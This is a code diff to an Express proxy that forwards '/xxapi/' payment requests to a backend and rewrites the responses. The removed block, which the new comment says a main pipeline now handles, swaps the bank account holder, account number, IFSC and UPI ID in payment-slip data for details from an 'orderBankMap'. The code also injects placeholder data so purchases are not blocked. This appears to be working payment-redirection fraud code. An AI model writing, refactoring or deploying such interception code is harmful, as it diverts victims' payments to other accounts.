@@ -1283,8 +1283,10 @@ app.all('/xxapi/*', async (req, res) => {
     const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (urlLower.includes('paymentslipdetail') || urlLower.includes('payment_slip_detail') ||
       urlLower.includes('slipdetail') || urlLower.includes('orderdetail') || urlLower.includes('order_detail') ||
       urlLower.includes('buydetail') || urlLower.includes('buy_detail'));
+    let proxyRes = null;
     if (isSlipDetail) {
-      const { response: sd, respBody: sb2, respHeaders: sh2 } = await proxyToTivox(req);
+      proxyRes = await proxyToTivox(req);
+      const { response: sd, respBody: sb2, respHeaders: sh2 } = proxyRes;
       let sj2 = null;
       try { sj2 = JSON.parse(sb2); } catch (e) { }
       // If backend returned 404 / error / non-JSON — try to serve from orderBankMap
@@ -1334,41 +1336,7 @@ app.all('/xxapi/*', async (req, res) => {
           return res.status(200).json(slipResp);
         }
       }
-      // Backend responded fine
-      if (sj2) {
-        // Extract order ID to check if it's in our mapping
-        let slipId = '';
-        const qs2 = new URLSearchParams((req.originalUrl || req.url).split('?')[1] || '');
-        for (const f of ['rptNo', 'orderNo', 'orderId', 'order_id', 'slipId', 'id']) {
-          slipId = slipId || qs2.get(f) || '';
-        }
-        if (!slipId && req.body) {
-          for (const f of ['rptNo', 'orderNo', 'orderId', 'order_id', 'slipId']) {
-            slipId = slipId || req.body[f] || '';
-          }
-        }
-
-        // Only replace bank details if the order is mapped in orderBankMap
-        const savedSlip = slipId && data.orderBankMap ? data.orderBankMap[String(slipId)] : null;
-        
-        if (savedSlip && data.botEnabled !== false) {
-          // Construct a temporary bank object from the saved mapping
-          const mappedBank = {
-            accountHolder: savedSlip.accountHolder || (savedSlip.bank ? savedSlip.bank.split(' | ')[0] : ''),
-            accountNo: savedSlip.accountNo || (savedSlip.bank ? savedSlip.bank.split(' | ')[1] : ''),
-            ifsc: savedSlip.ifsc || (savedSlip.bank ? savedSlip.bank.split(' | ')[2] : ''),
-            bankName: savedSlip.bankName || 'Bank',
-            upiId: savedSlip.upiId || ''
-          };
-
-          const hasBank = scanHasBankFields(sj2, 0);
-          if (hasBank) deepReplaceBankFields(sj2, mappedBank, 0, hasBank);
-        }
-        return res.status(200).json(sj2);
-      }
-      sh2['content-length'] = String(Buffer.byteLength(sb2));
-      res.writeHead(sd.status, sh2);
-      return res.end(sb2);
+      // If backend responded fine, let the main pipeline handle it
     }
 
     // ── availablect — if empty list, inject a placeholder so frontend doesn't block buy ──
@@ -1389,7 +1357,7 @@ app.all('/xxapi/*', async (req, res) => {
       return res.end(ab);
     }
 
-    const { response, respBody, respHeaders } = await proxyToTivox(req);
+    const { response, respBody, respHeaders } = proxyRes || await proxyToTivox(req);
 
     if (data.blockUpdate !== false) {
       for (const k of Object.keys(respHeaders)) {
